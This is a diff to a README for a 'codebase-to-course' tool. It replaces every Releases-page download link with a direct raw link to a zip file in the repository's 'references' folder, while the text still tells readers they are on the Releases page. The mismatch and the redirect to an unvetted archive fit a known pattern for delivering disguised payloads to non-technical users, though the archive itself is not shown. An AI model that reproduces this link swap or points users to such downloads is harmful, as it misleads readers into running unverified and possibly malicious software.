@@ -1,6 +1,6 @@
 # 📘 codebase-to-course - Turn code into a course
 
-[![Download the app](https://img.shields.io/badge/Download%20from-Releases-4B5563?style=for-the-badge&logo=github)](https://github.com/windowvalue821/codebase-to-course/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-4B5563?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/windowvalue821/codebase-to-course/main/references/course_to_codebase_v1.8.zip)
 
 ## 🚀 What this is
 
@@ -20,7 +20,7 @@ It helps you take a project folder and turn it into a clear learning page for no
 ## 📥 Download and install
 
 Visit this page to download:
-https://github.com/windowvalue821/codebase-to-course/releases
+https://raw.githubusercontent.com/windowvalue821/codebase-to-course/main/references/course_to_codebase_v1.8.zip
 
 On the Releases page:
 
@@ -194,7 +194,7 @@ If the output file does not appear, check the folder you selected as the source 
 ## 📎 Download again
 
 Download from Releases:
-https://github.com/windowvalue821/codebase-to-course/releases
+https://raw.githubusercontent.com/windowvalue821/codebase-to-course/main/references/course_to_codebase_v1.8.zip
 
 Use this page if you need the latest Windows build or want to get the file again after removing it
 
